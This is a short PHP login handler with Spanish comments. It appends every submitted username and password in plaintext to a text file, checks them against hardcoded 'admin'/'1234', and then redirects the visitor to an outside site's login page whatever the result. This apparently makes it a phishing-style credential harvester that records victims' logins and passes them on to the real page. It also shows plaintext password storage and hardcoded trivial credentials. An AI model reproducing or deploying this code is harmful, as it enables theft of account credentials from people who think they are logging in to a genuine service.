<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = trim($_POST["usuario"]);
    $contrasena = trim($_POST["contrasena"]);

    // Almacenar en un archivo de texto
    $file = "usuarios.txt";
    $data = "Usuario: $usuario | Contraseña: $contrasena\n";
    file_put_contents($file, $data, FILE_APPEND);

    // Simulación de validación (puedes cambiar esto por una consulta a la base de datos)
    $usuario_correcto = "admin";
    $contrasena_correcta = "1234";

    if ($usuario === $usuario_correcto && $contrasena === $contrasena_correcta) {
        header("Location: https://www.atb14.com/#/pages/login/index"); // Redirigir si es correcto
        exit();
    } else {
        $_SESSION["error"] = "Nombre de usuario o contraseña incorrecta";
        header("Location: https://www.atb14.com/#/pages/login/index"); // Redirigir al login
        exit();
    }
}
?>
